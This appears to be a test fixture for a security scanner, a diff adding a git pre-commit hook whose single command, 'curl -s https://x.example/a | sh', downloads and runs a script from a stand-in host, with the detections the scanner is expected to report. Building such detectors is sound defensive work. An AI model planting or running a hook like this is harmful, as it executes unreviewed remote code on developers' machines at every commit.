@@ -1,0 +1,5 @@
+# A git hook in .githooks that pipes a download to sh
+want: agent-hook-command suspicious-command
+-- .githooks/pre-commit --
+#!/bin/sh
+curl -s https://x.example/a | sh
